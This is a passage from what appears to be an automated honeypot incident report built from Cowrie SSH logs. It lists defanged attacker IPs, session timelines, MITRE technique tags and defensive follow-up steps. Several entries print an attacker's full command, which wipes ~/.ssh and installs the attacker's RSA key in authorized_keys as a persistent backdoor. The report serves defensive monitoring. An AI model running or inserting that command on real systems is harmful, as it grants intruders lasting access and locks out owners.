**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:55:25` | `cowrie.session.connect` |
| `2026-05-21 09:55:25` | `cowrie.client.version` |
| `2026-05-21 09:55:26` | `cowrie.client.kex` |
| `2026-05-21 09:55:33` | `cowrie.login.success` |
| `2026-05-21 09:55:35` | `cowrie.session.params` |
| `2026-05-21 09:55:35` | `cowrie.command.input` |
| `2026-05-21 09:55:35` | `cowrie.command.failed` |
| `2026-05-21 09:55:36` | `cowrie.log.closed` |
| `2026-05-21 09:55:38` | `cowrie.session.params` |
| `2026-05-21 09:55:38` | `cowrie.command.input` |
| `2026-05-21 09:55:42` | `cowrie.session.file_download` |
| `2026-05-21 09:55:42` | `cowrie.log.closed` |
| `2026-05-21 09:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.58.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `31.58.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8287f9a9fb4b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 09:55 |
| **Last Seen** | 2026-05-21 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:55:27` | `cowrie.session.connect` |
| `2026-05-21 09:55:27` | `cowrie.client.version` |
| `2026-05-21 09:55:28` | `cowrie.client.kex` |
| `2026-05-21 09:55:29` | `cowrie.login.success` |
| `2026-05-21 09:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b93d0efd5b8f

| Field | Detail |
|---|---|
| **Source IP** | `207.180.229[.]239` |
| **First Seen** | 2026-05-21 09:55 |
| **Last Seen** | 2026-05-21 09:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:55:29` | `cowrie.session.connect` |
| `2026-05-21 09:55:29` | `cowrie.client.version` |
| `2026-05-21 09:55:29` | `cowrie.client.kex` |
| `2026-05-21 09:55:29` | `cowrie.login.success` |
| `2026-05-21 09:55:30` | `cowrie.session.params` |
| `2026-05-21 09:55:30` | `cowrie.command.input` |
| `2026-05-21 09:55:30` | `cowrie.command.failed` |
| `2026-05-21 09:55:30` | `cowrie.log.closed` |
| `2026-05-21 09:55:30` | `cowrie.session.params` |
| `2026-05-21 09:55:30` | `cowrie.command.input` |
| `2026-05-21 09:55:30` | `cowrie.session.file_download` |
| `2026-05-21 09:55:30` | `cowrie.log.closed` |
| `2026-05-21 09:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.180.229[.]239` to AbuseIPDB if not already reported
- [ ] Block `207.180.229[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6cae1c20ac7

| Field | Detail |
|---|---|
| **Source IP** | `207.180.229[.]239` |
| **First Seen** | 2026-05-21 09:55 |
| **Last Seen** | 2026-05-21 09:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:55:32` | `cowrie.session.connect` |
| `2026-05-21 09:55:32` | `cowrie.client.version` |
| `2026-05-21 09:55:32` | `cowrie.client.kex` |
| `2026-05-21 09:55:33` | `cowrie.login.success` |
| `2026-05-21 09:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.180.229[.]239` to AbuseIPDB if not already reported
- [ ] Block `207.180.229[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83e0c82b7ae5

| Field | Detail |
|---|---|
| **Source IP** | `31.58.87[.]216` |
| **First Seen** | 2026-05-21 09:55 |
| **Last Seen** | 2026-05-21 09:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:55:58` | `cowrie.session.connect` |
| `2026-05-21 09:55:59` | `cowrie.client.version` |
| `2026-05-21 09:56:03` | `cowrie.client.kex` |
| `2026-05-21 09:56:06` | `cowrie.login.success` |
| `2026-05-21 09:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.58.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `31.58.87[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62f149750a8b

| Field | Detail |
|---|---|
| **Source IP** | `207.180.229[.]239` |
| **First Seen** | 2026-05-21 09:56 |
| **Last Seen** | 2026-05-21 09:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:56:32` | `cowrie.session.connect` |
| `2026-05-21 09:56:32` | `cowrie.client.version` |
| `2026-05-21 09:56:33` | `cowrie.client.kex` |
| `2026-05-21 09:56:33` | `cowrie.login.success` |
| `2026-05-21 09:56:33` | `cowrie.session.params` |
| `2026-05-21 09:56:33` | `cowrie.command.input` |
| `2026-05-21 09:56:33` | `cowrie.command.failed` |
| `2026-05-21 09:56:34` | `cowrie.log.closed` |
| `2026-05-21 09:56:34` | `cowrie.session.params` |
| `2026-05-21 09:56:34` | `cowrie.command.input` |
| `2026-05-21 09:56:34` | `cowrie.session.file_download` |
| `2026-05-21 09:56:34` | `cowrie.log.closed` |
| `2026-05-21 09:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.180.229[.]239` to AbuseIPDB if not already reported
- [ ] Block `207.180.229[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1421215191c

| Field | Detail |
|---|---|
| **Source IP** | `207.180.229[.]239` |
| **First Seen** | 2026-05-21 09:56 |
| **Last Seen** | 2026-05-21 09:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:56:36` | `cowrie.session.connect` |
| `2026-05-21 09:56:36` | `cowrie.client.version` |
| `2026-05-21 09:56:36` | `cowrie.client.kex` |
| `2026-05-21 09:56:36` | `cowrie.login.success` |
| `2026-05-21 09:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.180.229[.]239` to AbuseIPDB if not already reported
- [ ] Block `207.180.229[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-155f5b15c9c2

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 09:56 |
| **Last Seen** | 2026-05-21 09:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:56:37` | `cowrie.session.connect` |
| `2026-05-21 09:56:37` | `cowrie.client.version` |
| `2026-05-21 09:56:37` | `cowrie.client.kex` |
| `2026-05-21 09:56:38` | `cowrie.login.success` |
| `2026-05-21 09:56:39` | `cowrie.session.params` |
| `2026-05-21 09:56:39` | `cowrie.command.input` |
| `2026-05-21 09:56:39` | `cowrie.command.failed` |
| `2026-05-21 09:56:39` | `cowrie.log.closed` |
| `2026-05-21 09:56:40` | `cowrie.session.params` |
| `2026-05-21 09:56:40` | `cowrie.command.input` |
| `2026-05-21 09:56:40` | `cowrie.session.file_download` |
| `2026-05-21 09:56:40` | `cowrie.log.closed` |
| `2026-05-21 09:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c40f5dad11ec

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 09:56 |
| **Last Seen** | 2026-05-21 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:56:43` | `cowrie.session.connect` |
| `2026-05-21 09:56:43` | `cowrie.client.version` |
| `2026-05-21 09:56:44` | `cowrie.client.kex` |
| `2026-05-21 09:56:45` | `cowrie.login.success` |
| `2026-05-21 09:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be4713304bd8

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-05-21 10:00 |
| **Last Seen** | 2026-05-21 10:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 10:00:16` | `cowrie.session.connect` |
| `2026-05-21 10:00:16` | `cowrie.client.version` |
| `2026-05-21 10:00:16` | `cowrie.client.kex` |
| `2026-05-21 10:00:17` | `cowrie.login.success` |
| `2026-05-21 10:00:17` | `cowrie.session.params` |
| `2026-05-21 10:00:17` | `cowrie.command.input` |
| `2026-05-21 10:00:17` | `cowrie.command.failed` |
| `2026-05-21 10:00:17` | `cowrie.log.closed` |
| `2026-05-21 10:00:18` | `cowrie.session.params` |
| `2026-05-21 10:00:18` | `cowrie.command.input` |
| `2026-05-21 10:00:18` | `cowrie.session.file_download` |
| `2026-05-21 10:00:18` | `cowrie.log.closed` |
| `2026-05-21 10:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52683bbf65c9

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-05-21 10:00 |
| **Last Seen** | 2026-05-21 10:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 10:00:20` | `cowrie.session.connect` |
| `2026-05-21 10:00:20` | `cowrie.client.version` |
| `2026-05-21 10:00:20` | `cowrie.client.kex` |
| `2026-05-21 10:00:21` | `cowrie.login.success` |
| `2026-05-21 10:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc6d7a33afa6

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 10:01 |
| **Last Seen** | 2026-05-21 10:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 10:01:12` | `cowrie.session.connect` |
| `2026-05-21 10:01:12` | `cowrie.client.version` |
| `2026-05-21 10:01:12` | `cowrie.client.kex` |
| `2026-05-21 10:01:14` | `cowrie.login.success` |
| `2026-05-21 10:01:14` | `cowrie.session.params` |
| `2026-05-21 10:01:14` | `cowrie.command.input` |
| `2026-05-21 10:01:14` | `cowrie.command.failed` |
| `2026-05-21 10:01:14` | `cowrie.log.closed` |
| `2026-05-21 10:01:15` | `cowrie.session.params` |
| `2026-05-21 10:01:15` | `cowrie.command.input` |
| `2026-05-21 10:01:15` | `cowrie.session.file_download` |
| `2026-05-21 10:01:15` | `cowrie.log.closed` |
| `2026-05-21 10:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb08a4f94d69

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 10:01 |
| **Last Seen** | 2026-05-21 10:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 10:01:19` | `cowrie.session.connect` |
| `2026-05-21 10:01:19` | `cowrie.client.version` |
| `2026-05-21 10:01:19` | `cowrie.client.kex` |
| `2026-05-21 10:01:20` | `cowrie.login.success` |
| `2026-05-21 10:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45149b769a9e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 10:01 |
| **Last Seen** | 2026-05-21 10:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 10:01:49` | `cowrie.session.connect` |
| `2026-05-21 10:01:49` | `cowrie.client.version` |
| `2026-05-21 10:01:50` | `cowrie.client.kex` |
| `2026-05-21 10:01:51` | `cowrie.login.success` |
| `2026-05-21 10:01:52` | `cowrie.session.params` |
| `2026-05-21 10:01:52` | `cowrie.command.input` |
| `2026-05-21 10:01:52` | `cowrie.command.failed` |
| `2026-05-21 10:01:52` | `cowrie.log.closed` |
| `2026-05-21 10:01:53` | `cowrie.session.params` |
| `2026-05-21 10:01:53` | `cowrie.command.input` |
| `2026-05-21 10:01:53` | `cowrie.session.file_download` |
| `2026-05-21 10:01:53` | `cowrie.log.closed` |
| `2026-05-21 10:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e3c172228b6

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 10:01 |
| **Last Seen** | 2026-05-21 10:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 10:01:56` | `cowrie.session.connect` |
| `2026-05-21 10:01:56` | `cowrie.client.version` |
| `2026-05-21 10:01:56` | `cowrie.client.kex` |
| `2026-05-21 10:01:58` | `cowrie.login.success` |
| `2026-05-21 10:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eca039126a66

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 10:02 |
| **Last Seen** | 2026-05-21 10:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 10:02:27` | `cowrie.session.connect` |
| `2026-05-21 10:02:27` | `cowrie.client.version` |
| `2026-05-21 10:02:27` | `cowrie.client.kex` |
| `2026-05-21 10:02:29` | `cowrie.login.success` |
| `2026-05-21 10:02:29` | `cowrie.session.params` |
| `2026-05-21 10:02:29` | `cowrie.command.input` |
| `2026-05-21 10:02:29` | `cowrie.command.failed` |
| `2026-05-21 10:02:29` | `cowrie.log.closed` |
| `2026-05-21 10:02:30` | `cowrie.session.params` |
| `2026-05-21 10:02:30` | `cowrie.command.input` |
| `2026-05-21 10:02:30` | `cowrie.session.file_download` |
| `2026-05-21 10:02:30` | `cowrie.log.closed` |
| `2026-05-21 10:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1be7aa6cfb16

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 10:02 |
| **Last Seen** | 2026-05-21 10:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 10:02:34` | `cowrie.session.connect` |
| `2026-05-21 10:02:34` | `cowrie.client.version` |
| `2026-05-21 10:02:34` | `cowrie.client.kex` |
| `2026-05-21 10:02:35` | `cowrie.login.success` |
| `2026-05-21 10:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca3bcee152c3

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 10:03 |
| **Last Seen** | 2026-05-21 10:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 10:03:05` | `cowrie.session.connect` |
| `2026-05-21 10:03:05` | `cowrie.client.version` |
| `2026-05-21 10:03:06` | `cowrie.client.kex` |
| `2026-05-21 10:03:07` | `cowrie.login.success` |
| `2026-05-21 10:03:07` | `cowrie.session.params` |
| `2026-05-21 10:03:07` | `cowrie.command.input` |
| `2026-05-21 10:03:07` | `cowrie.command.failed` |
| `2026-05-21 10:03:08` | `cowrie.log.closed` |
| `2026-05-21 10:03:08` | `cowrie.session.params` |
| `2026-05-21 10:03:08` | `cowrie.command.input` |
| `2026-05-21 10:03:09` | `cowrie.session.file_download` |
